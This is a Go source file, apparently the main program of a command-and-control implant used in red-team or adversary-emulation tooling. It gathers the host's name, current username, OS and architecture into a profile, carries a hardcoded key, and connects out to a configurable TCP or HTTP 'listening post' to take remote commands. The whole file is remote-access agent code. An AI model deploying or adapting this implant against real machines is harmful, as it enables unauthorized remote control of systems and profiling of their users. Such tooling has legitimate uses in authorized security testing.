package main

import (
   "fmt"
   "os"
   "os/user"
   "runtime"
   "flag"

   "./util"
   "./output"
   "./sockets"
)

var (
   key = "94699f9970213dd1d4054ca678f1278a"
   contact = "tcp"
   socket = "localhost:5678"
   http = "http://localhost:8888"
)

func main() {
   host, _ := os.Hostname()
   user, _ := user.Current()
   platform := runtime.GOOS
   architecture := runtime.GOARCH
   executors := util.DetermineExecutors(platform, architecture)
   profile := fmt.Sprintf("%s$%s$%s$%s$%s", host, user.Username, platform, architecture, executors)

   contact := flag.String("contact", "tcp", "Which contact to use")
   socket := flag.String("socket", "0.0.0.0:5678", "The ip:port of the socket listening post")
   http := flag.String("http", "http://127.0.0.1:8888", "The FQDN of the HTTP listening post")
   inbound := flag.Int("inbound", 6000, "A port to use for inbound connections")
   verbose := flag.Bool("v", false, "Enable verbose output")
   flag.Parse()

   output.SetVerbose(*verbose)
   output.VerbosePrint(fmt.Sprintf("[*] %s outbound socket %s, inbound at %d", *contact, *socket, *inbound))

   coms, _ := sockets.CommunicationChannels[*contact]
   coms.Listen(key, *socket, *http, *inbound, profile)
}